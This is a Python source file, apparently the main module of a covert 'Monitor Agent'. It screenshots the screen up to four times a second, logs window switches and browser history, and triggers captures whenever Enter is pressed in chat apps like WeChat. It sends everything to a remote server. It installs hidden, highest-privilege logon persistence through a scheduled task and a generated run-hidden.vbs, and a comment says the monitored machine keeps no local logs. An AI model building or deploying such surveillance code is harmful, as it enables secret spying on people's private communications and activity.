"""
Agent 主程序 - 精简版
协调采集模块，数据上报服务端
"""
import sys
import os
import time
import json
import subprocess
import threading

import requests

from config import (
    SERVER_URL, AGENT_NAME, IS_WINDOWS, IS_LINUX,
    SCREENSHOT_INTERVAL, APP_TRACK_INTERVAL, BROWSER_HISTORY_INTERVAL,
    HEARTBEAT_INTERVAL, RETRY_TIMES, RETRY_DELAY,
)
from screen_capture import ScreenCapture
from app_tracker import AppTracker
from browser_history import BrowserHistoryCollector
from keyboard_monitor import KeyboardEnterMonitor


# ============================================
# 数据上报
# ============================================

class Reporter:
    """HTTP 上报器"""

    def __init__(self, server_url: str, agent_name: str):
        self.url = server_url.rstrip("/")
        self.agent = agent_name
        self.sess = requests.Session()
        self.sess.headers["Content-Type"] = "application/json"

    def _post(self, endpoint: str, data: dict) -> bool:
        for i in range(RETRY_TIMES):
            try:
                r = self.sess.post(
                    f"{self.url}/api/{endpoint}",
                    json=data, timeout=10
                )
                if r.status_code == 200:
                    return True
                print(f"  [!] {endpoint} -> {r.status_code}")
            except requests.exceptions.ConnectionError:
                print(f"  [!] 连接失败 ({endpoint}), 重试 {i+1}/{RETRY_TIMES}")
                if i == RETRY_TIMES - 1:
                    self.diagnostic("network", "ERROR",
                        f"连接失败 ({endpoint})，已重试{RETRY_TIMES}次仍失败")
            except Exception as e:
                print(f"  [!] 异常: {e}")
                self.diagnostic("system", "ERROR", f"上报异常 ({endpoint}): {e}")
            if i < RETRY_TIMES - 1:
                time.sleep(RETRY_DELAY)
        return False

    def diagnostic(self, category: str, level: str, message: str):
        """上报诊断信息 — 被控机不写本地日志"""
        try:
            self.sess.post(
                f"{self.url}/api/diagnostics",
                json={
                    "agent_name": self.agent,
                    "category": category,
                    "level": level,
                    "message": message,
                },
                timeout=5
            )
        except Exception:
            pass  # 诊断上报失败不应阻塞主流程

    def screenshot(self, data: dict):
        mon_idx = data.get("monitor_index", 0)
        mon_total = data.get("monitor_total", 1)
        ok = self._post("screenshot", {
            "agent_name": self.agent,
            "type": "screenshot",
            "timestamp": data["timestamp"],
            "image_base64": data["image_base64"],
            "format": data.get("format", "jpeg"),
            "monitor_index": mon_idx,
            "monitor_total": mon_total,
        })
        if ok:
            mon_tag = f" [屏{mon_idx+1}/{mon_total}]" if mon_total > 1 else ""
            print(f"  [OK] 截图 {data['timestamp']}{mon_tag}")

    def window(self, data: dict):
        self._post("app_event", {
            "agent_name": self.agent,
            "type": "app_switch",
            "window_title": data.get("window_title", ""),
            "process_name": data.get("process_name", ""),
            "process_path": data.get("process_path", ""),
            "timestamp": data.get("timestamp", ""),
            "screenshot_timestamp": data.get("screenshot_timestamp", ""),
        })

    def browser(self, records: list):
        ok = self._post("browser_history", {
            "agent_name": self.agent,
            "records": records,
        })
        if ok:
            print(f"  [OK] 浏览器 {len(records)} 条")

    def chat_enter(self, data: dict):
        """上报聊天 Enter 事件 — process_name 使用原始进程名保持一致"""
        ok = self._post("app_event", {
            "agent_name": self.agent,
            "type": "chat_enter",
            "window_title": data.get("window_title", ""),
            # 使用原始 process_name (如 "WeChat.exe") 确保聚合一致性
            "process_name": data.get("process_name", ""),
            "process_path": data.get("process_path", data.get("process_name", "")),
            "display_name": data.get("display_name", ""),
            "timestamp": data.get("timestamp", ""),
            "screenshot_timestamp": data.get("screenshot_timestamp", ""),
        })
        if ok:
            print(f"  [OK] Enter事件 {data.get('display_name', '?')}")

    def heartbeat(self, screenshot_interval: float = 0, ip: str = ""):
        data = {
            "agent_name": self.agent,
            "screenshot_interval": screenshot_interval,
        }
        if ip:
            data["ip"] = ip
        self._post("heartbeat", data)


# ============================================
# Agent 主控
# ============================================

# ============================================
# 自适应截图频率 — 全局状态
# ============================================
_state_lock = threading.Lock()               # 保护以下两个跨线程共享变量
_last_activity_time = time.time()            # 最后一次用户活动时间
_server_interval = SCREENSHOT_INTERVAL       # 服务端下发的截图间隔


def record_activity():
    """记录用户活动时间戳，供自适应频率控制器使用"""
    global _last_activity_time
    with _state_lock:
        _last_activity_time = time.time()


def _start_activity_monitor():
    """Windows: 使用 GetLastInputInfo 检测用户空闲时间（覆盖所有输入设备）"""
    global _get_idle_seconds
    if IS_WINDOWS:
        try:
            import ctypes
            from ctypes import wintypes

            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [
                    ('cbSize', wintypes.UINT),
                    ('dwTime', wintypes.DWORD),
                ]

            _user32 = ctypes.windll.user32
            _kernel32 = ctypes.windll.kernel32

            def _get_idle_seconds_win32():
                lii = LASTINPUTINFO()
                lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
                _user32.GetLastInputInfo(ctypes.byref(lii))
                return (_kernel32.GetTickCount() - lii.dwTime) / 1000.0

            _get_idle_seconds = _get_idle_seconds_win32
            print("  [Activity] Win32 GetLastInputInfo 活动检测已启用")
        except Exception as e:
            print(f"  [!] Win32 活动检测失败: {e}")
    else:
        print("  [Activity] 非 Windows 平台，跳过活动检测")


def _get_idle_seconds():
    """默认: 使用 _last_activity_time 推算（兜底）"""
    with _state_lock:
        return time.time() - _last_activity_time


def ensure_scheduled_task():
    """检查并注册 Windows 计划任务（开机自启）"""
    if not IS_WINDOWS:
        return

    task_name = "MonitorAgent"

    # 检查是否已存在
    try:
        result = subprocess.run(
            ["schtasks.exe", "/Query", "/TN", task_name],
            capture_output=True, text=True,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            return  # 已注册，跳过
    except FileNotFoundError:
        return  # schtasks.exe 不存在

    # 获取当前 exe 路径
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(__file__)

    exe_dir = os.path.dirname(exe_path)
    vbs_path = os.path.join(exe_dir, "run-hidden.vbs")

    # 创建 run-hidden.vbs（如果不存在）
    if not os.path.exists(vbs_path):
        try:
            with open(vbs_path, 'w', encoding='utf-8') as f:
                f.write('Set WshShell = CreateObject("WScript.Shell")\n')
                f.write(f'WshShell.Run """{exe_path}""", 0, False\n')
        except OSError:
            pass

    # 注册计划任务（需要管理员权限）
    try:
        result = subprocess.run(
            [
                "schtasks.exe", "/Create",
                "/TN", task_name,
                "/TR", f'wscript.exe "{vbs_path}"',
                "/SC", "ONLOGON",
                "/RL", "HIGHEST",
                "/F",
            ],
            capture_output=True, text=True,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            print(f"  [✓] 已注册计划任务: {task_name}")
        else:
            print(f"  [!] 注册计划任务失败（可能需要管理员权限）: {result.stderr.strip()}")
            print(f"  [!] 提示: 右键以管理员身份运行可完成注册")
    except Exception as e:
        print(f"  [!] 注册计划任务异常: {e}")


def _resolve_agent_name(base_name: str) -> str:
    """原子注册 — 服务端检查名称冲突并返回已解析的名称，避免竞态"""
    try:
        r = requests.post(f"{SERVER_URL}/api/register",
                          json={"agent_name": base_name}, timeout=5)
        if r.status_code == 200:
            resolved = r.json().get("agent_name", base_name)
            if resolved != base_name:
                print(f"  [!] 名称 '{base_name}' 已被占用，自动切换为: {resolved}")
            return resolved
    except Exception:
        pass  # 服务端不可达时用原名
    return base_name


def main(stop_event=None):
    """主函数 — stop_event 可选，用于 Windows 服务接收停止信号"""
    global _server_interval
    platform = "Windows" if IS_WINDOWS else ("Linux" if IS_LINUX else "?")

    # DPI 感知 — 必须在任何 GUI/截图操作前设置，解决高 DPI 多屏截图内容相同的问题
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.shcore.SetProcessDpiAwareness(2)  # Per-monitor DPI aware
        except Exception:
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except Exception:
                print("  [WARN] DPI 感知设置失败，多屏截图可能内容相同")

    # 自动注册计划任务（首次运行）
    try:
        ensure_scheduled_task()
    except Exception as e:
        print(f"  [!] 计划任务注册跳过: {e}")

    # 解析 Agent 名称（检测冲突并自动加后缀）
    agent_name = _resolve_agent_name(AGENT_NAME)

    # 获取本机 IP（启动时获取一次，心跳时复用）
    from config import get_local_ip
    local_ip = get_local_ip()
    if local_ip:
        print(f"  [✓] 本机 IP: {local_ip}")
    else:
        print("  [!] 无法获取本机 IP")

    reporter = Reporter(SERVER_URL, agent_name)

    print("=" * 50)
    print(f"  Monitor Agent - 精简版")
    print(f"  平台: {platform}")
    print(f"  名称: {agent_name}")
    print(f"  服务端: {SERVER_URL}")
    print(f"  截图/{SCREENSHOT_INTERVAL}s  窗口/{APP_TRACK_INTERVAL}s  浏览器/{BROWSER_HISTORY_INTERVAL}s")
    print("=" * 50)

    # 检查服务端连通性
    try:
        r = requests.get(f"{SERVER_URL}/api/health", timeout=5)
        if r.status_code == 200:
            print("  [OK] 服务端可达")
        else:
            print(f"  [WARN] 服务端异常: {r.status_code}")
    except Exception as e:
        print(f"  [FAIL] 无法连接服务端: {e}")
        if stop_event is None:
            # 命令行模式：询问是否继续
            if input("  继续? (y/n): ").lower() != 'y':
                return
        # 服务模式：自动继续，后台重试

    # 上报上线
    reporter._post("status", {
        "agent_name": agent_name,
        "status": "online",
        "message": f"Agent started ({platform})",
    })
    reporter.diagnostic("system", "INFO", f"Agent 启动 ({platform})")

    # 启动采集模块
    screenshot = ScreenCapture(interval=SCREENSHOT_INTERVAL)
    screenshot.add_listener(reporter.screenshot)

    window = AppTracker(interval=APP_TRACK_INTERVAL)

    def on_app_switch_with_screenshot(info):
        """窗口切换时立即触发截图（全屏），确保有时间戳接近的截图"""
        shots = screenshot.capture_once()
        if shots:
            for shot in shots:
                reporter.screenshot(shot)
            info["screenshot_timestamp"] = shots[0]["timestamp"]
        reporter.window(info)
        record_activity()  # 窗口切换也视为活动

    window.add_listener(on_app_switch_with_screenshot)

    browser = BrowserHistoryCollector(interval=BROWSER_HISTORY_INTERVAL)
    browser.add_listener(reporter.browser)

    # 键盘 Enter 监控 — 聊天应用发送消息时触发截图
    keyboard_monitor = KeyboardEnterMonitor()

    def on_chat_enter(info):
        """Enter 键在聊天应用中按下 → 立即截图（全屏）+ 上报事件"""
        shots = screenshot.capture_once()
        if shots:
            for shot in shots:
                reporter.screenshot(shot)
            # 嵌入截图时间戳，供服务端精确关联事件与截图
            info["screenshot_timestamp"] = shots[0]["timestamp"]
        reporter.chat_enter(info)
        record_activity()  # 标记活动，触发高频截图

    keyboard_monitor.add_listener(on_chat_enter)

    # 通用活动监听 — 鼠标移动/点击/滚轮 + 任意按键均标记活跃
    _start_activity_monitor()

    screenshot.start()
    window.start()
    browser.start()
    keyboard_monitor.start()

    # 心跳线程
    def heartbeat_loop():
        while True:
            reporter.heartbeat(screenshot.interval, local_ip)
            time.sleep(HEARTBEAT_INTERVAL)

    threading.Thread(target=heartbeat_loop, daemon=True).start()

    # 服务端配置轮询 — 只更新 _server_interval，最终由频率控制器裁决
    def config_poller():
        global _server_interval
        while True:
            try:
                r = requests.get(
                    f"{SERVER_URL}/api/config?agent={agent_name}",
                    timeout=5
                )
                if r.status_code == 200:
                    cfg = r.json()
                    new_interval = cfg.get("screenshot_interval", SCREENSHOT_INTERVAL)
                    with _state_lock:
                        if new_interval != _server_interval:
                            _server_interval = new_interval
                            status = "LIVE" if new_interval <= 1.5 else "IDLE"
                            print(f"  [>>] 观察状态: {status}  服务端间隔: {new_interval}s")
            except Exception:
                pass
            time.sleep(3)

    threading.Thread(target=config_poller, daemon=True).start()

    # 自适应截图频率控制器 — 4级: ACTIVE → LIGHT_IDLE → DEEP_IDLE → VERY_DEEP_IDLE
    def screenshot_frequency_controller():
        global _server_interval
        ACTIVE_INTERVAL = 0.25         # 活跃 → 每秒 4 次
        LIGHT_IDLE_INTERVAL = 10.0     # 轻度闲置 (1-5min) → 每 10 秒 1 次
        DEEP_IDLE_INTERVAL = 60.0      # 深度闲置 (5-30min) → 每分钟 1 次
        VERY_DEEP_IDLE_INTERVAL = 600.0 # 极深闲置 (30min+) → 每 10 分钟 1 次
        ACTIVE_THRESHOLD = 60.0        # 1 分钟无操作 → 进入轻度闲置
        LIGHT_IDLE_THRESHOLD = 300.0   # 5 分钟无操作 → 进入深度闲置
        DEEP_IDLE_THRESHOLD = 1800.0   # 30 分钟无操作 → 进入极深闲置
        last_interval = None

        while True:
            idle_sec = _get_idle_seconds()
            # 快照服务端间隔，减少持锁时间
            with _state_lock:
                srv_interval = _server_interval

            # LIVE 模式 (观察者存在): 所有闲置级别都降到 srv_interval，除非 ACTIVE 更快
            if srv_interval <= 1.5 and idle_sec >= ACTIVE_THRESHOLD:
                target = srv_interval
            elif idle_sec < ACTIVE_THRESHOLD:
                target = ACTIVE_INTERVAL
            elif idle_sec < LIGHT_IDLE_THRESHOLD:
                target = LIGHT_IDLE_INTERVAL
            elif idle_sec < DEEP_IDLE_THRESHOLD:
                target = DEEP_IDLE_INTERVAL
            else:
                target = VERY_DEEP_IDLE_INTERVAL

            if target != last_interval:
                screenshot.set_interval(target)
                if idle_sec < ACTIVE_THRESHOLD:
                    mode = f"ACTIVE ({idle_sec:.0f}s 空闲)"
                elif target <= 1.5:
                    mode = "VIEWER"
                elif target == LIGHT_IDLE_INTERVAL:
                    mode = f"LIGHT_IDLE ({idle_sec:.0f}s 空闲)"
                elif target == DEEP_IDLE_INTERVAL:
                    mode = f"DEEP_IDLE ({idle_sec:.0f}s 空闲)"
                else:
                    mode = f"VERY_DEEP_IDLE ({idle_sec:.0f}s 空闲)"
                print(f"  [Adaptive] {mode}  截图间隔: {target}s")
                last_interval = target

            time.sleep(1)

    threading.Thread(target=screenshot_frequency_controller, daemon=True).start()

    print("\n  Agent 运行中, Ctrl+C 停止\n")

    def shutdown():
        """统一关闭逻辑"""
        print("\n  正在停止...")
        reporter._post("status", {
            "agent_name": agent_name,
            "status": "offline",
            "message": "Agent stopped",
        })
        screenshot.stop()
        window.stop()
        browser.stop()
        keyboard_monitor.stop()
        print("  Agent 已停止")

    try:
        if stop_event:
            # 服务模式：等待停止信号
            import win32event
            win32event.WaitForSingleObject(stop_event, win32event.INFINITE)
        else:
            # 命令行模式：等待 Ctrl+C
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        shutdown()


if __name__ == "__main__":
    main()
